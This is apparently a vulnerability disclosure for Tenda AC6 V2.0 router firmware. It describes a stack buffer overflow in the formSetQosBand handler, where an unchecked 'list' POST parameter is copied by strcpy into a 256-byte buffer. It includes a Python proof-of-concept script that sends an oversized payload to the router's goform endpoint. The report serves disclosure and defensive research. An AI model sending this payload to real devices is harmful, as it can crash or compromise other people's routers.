# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "formSetQosBand"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

In the `formSetQosBand` function, a **stack buffer overflow** occurs. This happens when a user crafts a POST request with an unvalidated **`list`** parameter. This `list` parameter is then passed to the `setQosMiblist` function, where it's copied into the `qos_str` buffer (which has a size of `256` bytes) using `strcpy(qos_str, p);`. Since **no validation** is performed on the input `list`'s length, providing a string longer than 255 characters will lead to an overflow of `qos_str`.

![image-20250617000950271](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250617000950271.png)

![image-20250617001017897](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250617001017897.png)

poc

```python
import requests
def send_payload(url, payload):
    params={
            'list':payload}
    cookie={'password':'gfytgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500+b'\n'
url="http://192.168.1.1/goform/SetNetControlList"
send_payload(url, payload)   
```

![image-20250617000731965](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250617000731965.png)



